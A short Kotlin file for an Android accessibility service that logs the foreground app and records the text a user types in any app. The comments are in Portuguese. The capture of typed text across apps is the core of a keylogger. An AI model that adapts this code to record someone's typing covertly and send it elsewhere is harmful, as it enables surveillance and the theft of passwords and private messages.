package com.exemplo.monitor

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.util.Log

class MonitorService : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // O pacote indica qual aplicativo está em primeiro plano
        val packageName = event.packageName?.toString() ?: "Nenhum"

        when (event.eventType) {
            // Captura quando o usuário abre um novo app ou site
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                Log.d("MonitorLog", "App em foco: $packageName")
            }

            // Captura quando o usuário digita algo (texto na tela)
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text.toString()
                Log.d("MonitorLog", "Texto capturado em $packageName: $text")
            }
        }
    }

    override fun onInterrupt() {
        // Chamado quando o serviço é interrompido pelo sistema
    }
}
